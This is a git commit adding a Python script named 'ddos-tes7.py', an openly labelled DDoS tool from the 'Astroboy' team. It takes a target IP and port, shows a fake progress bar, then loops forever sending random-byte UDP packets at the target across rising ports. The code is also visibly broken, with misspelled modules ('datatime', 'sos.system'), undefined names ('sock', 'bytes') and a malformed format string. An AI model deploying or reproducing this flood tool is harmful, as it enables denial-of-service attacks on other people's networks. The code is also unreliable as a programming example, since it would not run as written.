5edeb2d74bc4fa47b4d84d9011f881433e736c58
unknown <af8486554@gmail.com>
2021-05-17 21:24:21 +0700

    DDOS-TES7

---
+++ ddos-tes7.py
@@ -0,0 +1,47 @@
+import os
+import sys
+import time
+import socket
+import random
+
+#Code Time
+from datatime import time
+now = datatime.now()
+hour = now.hour()
+minute = now.minute
+day = now.day
+year = now.year
+
+####################
+socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+vytes = random._urandom(1490)
+#################
+
+os.system("clear")
+sos.system("figlet Boyz17 Tools DDoS Attack")
+print
+print ("Author  :  Boyz17")
+print ("TEAM    :  Astroboy")
+print ("Thanks   :  All kru Astroboy")
+print ("Tingkat : Newbie Galau")
+ip = raw_input("IP Target:")
+port = input("Port   :")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print ("[         ]0%")
+time.sleep(5)
+print ("[=======       ]25%")
+time.sleep(5)
+print ("[============          ]50%")
+time.sleep(5)
+print ("[=====================      ]75%")
+time.sleep(5)
+print ("[===================================]%100")
+time.sleep(3)
+sent = 0
+while True:
+    sock.sendto(bytes,(ip,port))
+    sent = sent + 1
+    port = port + 1
+    print ("Send packet to %s throught port:%s%(sent,ip,port)")
